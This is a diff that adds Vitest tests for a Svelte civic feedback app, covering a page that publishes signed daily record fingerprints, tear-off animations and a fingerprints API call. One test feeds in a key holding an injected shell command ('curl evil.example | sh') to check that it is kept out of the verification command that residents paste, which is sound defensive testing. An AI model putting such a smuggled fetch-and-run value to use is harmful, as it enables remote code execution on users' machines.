@@ -3,10 +3,11 @@ import { flushSync, mount, unmount } from "svelte";
 import { afterEach, describe, expect, it, vi } from "vitest";
 
 import DeskIdeas from "../src/components/DeskIdeas.svelte";
+import DeskRecord from "../src/components/DeskRecord.svelte";
 import Feedback from "../src/components/Feedback.svelte";
 import Procedures from "../src/components/Procedures.svelte";
 import Votes from "../src/components/Votes.svelte";
-import { currentStage, localizedText, RemoteDesk, shares, type DeskClient, type FeedbackLookup, type Idea, type Procedure, type ProcedureDetail, type Round, type RoundDetail } from "../src/lib/desk.ts";
+import { currentStage, localizedText, RemoteDesk, shares, type DeskClient, type Fingerprints, type FeedbackLookup, type Idea, type Procedure, type ProcedureDetail, type Round, type RoundDetail } from "../src/lib/desk.ts";
 import { CompanionFailure } from "../src/lib/errors.ts";
 import { prefs } from "../src/lib/prefs.ts";
 import { setLang } from "../src/lib/ui.svelte.ts";
@@ -117,9 +118,20 @@ const LOOKUP: FeedbackLookup = {
   created_at: "2026-09-26T09:00:00.000Z",
 };
 
+const DESK_KEY = "cracia.example/desk+0359480b+AcmnaIVEUPKKWoLQTSirbvfV4h6hZdgFTrjS6g40yKjN";
+const RECORD: Fingerprints = {
+  enabled: true,
+  key: DESK_KEY,
+  days: [
+    { day: "2026-10-07", size: 73, root: "c3ElVZbx2fJQx8i1n9mxYcdxB0Y3W0tG8b2xS1JmNjk=", signed_at: "2026-10-07T00:00:12.000Z", note: "n1", ots: "AE9w" },
+    { day: "2026-10-08", size: 1280, root: "VcDqouuhF6x6xEe2JEKlx0vBHLDwEVMHSQOiOMk2wVE=", signed_at: "2026-10-08T00:00:12.000Z", note: "n2", ots: null },
+  ],
+};
+
 /** A desk that answers from the fixtures and records every write. */
 class FakeDesk implements DeskClient {
   signed: boolean;
+  record: Fingerprints = RECORD;
   calls: { what: string; args: unknown[] }[] = [];
   myBallot: number | null = null;
   constructor(signed = false) {
@@ -188,6 +200,9 @@ class FakeDesk implements DeskClient {
     this.myBallot = option;
     return { option };
   }
+  async fingerprints() {
+    return this.record;
+  }
 }
 
 let app: Record<string, unknown> | null = null;
@@ -219,6 +234,8 @@ const click = (el: Element | null | undefined) => {
   (el as HTMLButtonElement).click();
   flushSync();
 };
+const ended = (el: Element) => el.dispatchEvent(Object.assign(new Event("animationend"), { animationName: "tear" }));
+const motion = (on: boolean) => (document.documentElement.dataset.motion = on ? "on" : "off");
 
 describe("Procedures page", () => {
   it("lists procedures by status with their own stage track, and opens the detail with updates, answers, linked ideas", async () => {
@@ -373,6 +390,66 @@ describe("Ideas on the desk", () => {
   });
 });
 
+describe("Tearing off what is dismissed", () => {
+  afterEach(() => void delete document.documentElement.dataset.motion);
+
+  it("tears off a withdrawn support, then shows the button unpressed and keeps it in focus", async () => {
+    motion(true);
+    const desk = new FakeDesk(true);
+    const target = await show(DeskIdeas, { client: desk });
+    const button = () => target.querySelectorAll("[data-state=list] > li")[1].querySelector<HTMLElement>("[data-action=support]")!;
+    click(button());
+    await settle();
+    // Supporting is pasted on, never torn.
+    expect(button().classList.contains("tearing")).toBe(false);
+    expect(button().getAttribute("aria-pressed")).toBe("true");
+    click(button());
+    await settle();
+    expect(desk.calls.at(-1)).toEqual({ what: "support", args: [IDEA2_ID, false] });
+    expect(button().classList.contains("tearing")).toBe(true);
+    expect(button().getAttribute("aria-pressed")).toBe("true");
+    ended(button());
+    await settle();
+    expect(button().classList.contains("tearing")).toBe(false);
+    expect(button().getAttribute("aria-pressed")).toBe("false");
+    expect(button().textContent?.trim()).toBe("Support");
+    expect(document.activeElement).toBe(button());
+
+    // With motion off the support goes at once.
+    motion(false);
+    click(button());
+    await settle();
+    click(button());
+    await settle();
+    expect(button().classList.contains("tearing")).toBe(false);
+    expect(button().getAttribute("aria-pressed")).toBe("false");
+  });
+
+  it("tears off the feedback's subject, drops it, and moves on to the message box", async () => {
+    motion(true);
+    let cleared = 0;
+    const target = await show(Feedback, { client: new FakeDesk(), about: { about: { kind: "procedure", id: PROC_ID }, title: "Resurfacing" }, onclearabout: () => void cleared++ });
+    const about = target.querySelector("[data-state=about]")!;
+    click([...about.querySelectorAll("button")].find((b) => b.textContent?.includes("Not about this")));
+    expect(about.classList.contains("tearing")).toBe(true);
+    expect(cleared).toBe(0);
+    ended(about);
+    await settle();
+    expect(cleared).toBe(1);
+    expect(document.activeElement).toBe(target.querySelector("[data-state=form] textarea"));
+    unmount(app!);
+    app = null;
+
+    motion(false);
+    const again = await show(Feedback, { client: new FakeDesk(), about: { about: { kind: "procedure", id: PROC_ID }, title: "Resurfacing" }, onclearabout: () => void cleared++ });
+    const about2 = again.querySelector("[data-state=about]")!;
+    click([...about2.querySelectorAll("button")].find((b) => b.textContent?.includes("Not about this")));
+    expect(about2.classList.contains("tearing")).toBe(false);
+    await settle();
+    expect(cleared).toBe(2);
+  });
+});
+
 describe("Feedback page", () => {
   it("files a message with no sign-in and shows the lookup code big in mono", async () => {
     const desk = new FakeDesk();
@@ -506,6 +583,45 @@ describe("Votes page", () => {
   });
 });
 
+describe("Checking the record page", () => {
+  it("shows the latest fingerprint, every day, a copy to keep and the outside check", async () => {
+    const target = await show(DeskRecord, { client: new FakeDesk(), origin: "https://cracia.example" });
+    const latest = target.querySelector("[data-state=latest]")!;
+    expect(latest.querySelector("[data-testid=print]")!.textContent).toBe("VcDq ouuh F6x6 xEe2");
+    expect(latest.textContent).toContain("entries on record");
+    expect(latest.textContent).toContain("Waiting for its public timestamp.");
+    expect(target.querySelectorAll("[data-state=days] li")).toHaveLength(2);
+    expect(target.querySelector("[data-state=days] li")!.textContent).toContain("VcDq");
+    const command = target.querySelector("[data-testid=command]")!.textContent!;
+    expect(command).toContain("--url https://cracia.example/api/desk");
+    expect(command).toContain(`--vkey '${DESK_KEY}'`);
+    expect(target.textContent).toContain("no names, no messages and no ballots");
+
+    const saved: Blob[] = [];
+    vi.stubGlobal("URL", Object.assign(URL, { createObjectURL: (b: Blob) => (saved.push(b), "blob:x"), revokeObjectURL: () => {} }));
+    click(target.querySelector("[data-testid=save]"));
+    const copy = JSON.parse(await saved[0].text());
+    expect(copy).toEqual({ enabled: true, key: DESK_KEY, days: RECORD.days.map(({ day, size, note, ots }) => ({ day, size, note, ots })) });
+  });
+
+  it("keeps a key that is not a verifier key out of the command residents paste", async () => {
+    const desk = new FakeDesk();
+    desk.record = { ...RECORD, key: "x+00000000+AA'; curl evil.example | sh; echo '" };
+    const target = await show(DeskRecord, { client: desk, origin: "https://cracia.example" });
+    const command = target.querySelector("[data-testid=command]")!.textContent!;
+    expect(command).toContain("--vkey '<key>'");
+    expect(command).not.toContain("curl");
+  });
+
+  it("says so when the desk publishes no fingerprint, in the resident's language", async () => {
+    const desk = new FakeDesk();
+    desk.record = { enabled: false, key: null, days: [] };
+    const target = await show(DeskRecord, { client: desk }, "fr");
+    expect(target.querySelector("[data-state=off]")!.textContent).toContain("ne publie pas encore");
+    expect(target.querySelector("[data-state=latest]")).toBeNull();
+  });
+});
+
 describe("no raw ids", () => {
   it("shows no desk id on any page, list or detail, in any state", async () => {
     const desk = new FakeDesk(true);
@@ -543,6 +659,17 @@ describe("no raw ids", () => {
 
 describe("RemoteDesk", () => {
   const answer = (status: number, body: unknown) => vi.fn(async () => new Response(JSON.stringify(body), { status }));
+
+  it("reads the fingerprints without the resident's token and refuses a malformed answer", async () => {
+    prefs.setDeskToken("tok-123");
+    const ok = answer(200, { ...RECORD, origin: "cracia.example/desk", days: RECORD.days.map((d) => ({ ...d, note_sha256: "ab" })) });
+    vi.stubGlobal("fetch", ok);
+    const got = await new RemoteDesk().fingerprints();
+    expect(got.days.map((d) => d.size)).toEqual([73, 1280]);
+    expect(ok).toHaveBeenCalledWith("/api/desk/fingerprints", expect.objectContaining({ method: "GET", headers: {} }));
+    vi.stubGlobal("fetch", answer(200, { enabled: true, days: [{ day: "2026-10-08" }] }));
+    await expect(new RemoteDesk().fingerprints()).rejects.toBeInstanceOf(CompanionFailure);
+  });
 
   it("sends the resident token, and the right bodies for a verdict, a ballot, an idea and feedback", async () => {
     prefs.setDeskToken("tok-123");
